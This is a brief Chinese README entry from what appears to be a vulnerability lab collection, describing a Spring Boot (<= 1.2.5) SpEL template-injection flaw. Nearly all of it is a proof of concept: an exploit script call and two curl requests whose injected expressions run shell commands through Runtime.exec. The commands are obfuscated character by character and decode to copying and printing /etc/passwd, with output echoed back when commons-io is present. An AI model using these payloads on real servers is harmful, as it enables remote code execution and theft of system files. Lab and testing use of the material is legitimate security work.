## SpringBoot SSTI

测试镜像

* src/springboot/1.2.5/

影响版本

* <= 1.2.5

参考链接

* [Spring Boot RCE](http://deadpool.sh/2017/RCE-Springs/)

Poc

```
exp 脚本
python /root/run.py 'http://127.0.0.1:8080' "cp /etc/passwd /tmp"

利用
curl -g 'http://127.0.0.1:8080' -d 'id=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)))}' -H 'Accept: text/html'

如果服务器安装了 commons-io，可以看回显
curl -g 'http://127.0.0.1:8080' -d 'id=${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(104).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}' -H 'Accept: text/html'
```


